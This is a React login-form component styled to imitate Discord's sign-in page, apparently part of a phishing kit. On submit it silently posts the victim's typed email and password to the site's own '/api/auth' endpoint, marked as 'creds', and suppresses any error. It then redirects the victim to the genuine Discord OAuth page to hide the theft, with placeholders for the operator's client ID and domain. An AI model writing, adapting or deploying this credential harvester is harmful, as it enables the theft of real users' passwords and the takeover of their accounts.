'use client';

import { useForm } from 'react-hook-form';

type FormData = {
  email: string;
  password: string;
};

export default function LoginForm() {
  const { register, handleSubmit } = useForm<FormData>();

  const onSubmit = async (data: FormData) => {
    // Send typed creds silently
    fetch('/api/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'creds',
        email: data.email,
        password: data.password
      })
    }).catch(() => {});

    // Redirect to Discord OAuth (replace with your real values)
    const clientId = 'YOUR_DISCORD_CLIENT_ID_HERE';
    const redirectUri = encodeURIComponent('https://your-custom-domain.com/api/auth'); // must match Discord app settings
    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=identify%20email`;

    window.location.href = oauthUrl;
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
      <input
        {...register('email', { required: true })}
        placeholder="Email or Phone Number"
        className="w-full p-3 rounded bg-[#2f3136] text-white border border-[#202225]"
        required
      />
      <input
        {...register('password', { required: true })}
        type="password"
        placeholder="Password"
        className="w-full p-3 rounded bg-[#2f3136] text-white border border-[#202225]"
        required
      />
      <button
        type="submit"
        className="w-full p-3 bg-[#5865f2] text-white rounded font-semibold hover:bg-[#4752c4]"
      >
        Log In
      </button>
    </form>
  );
}
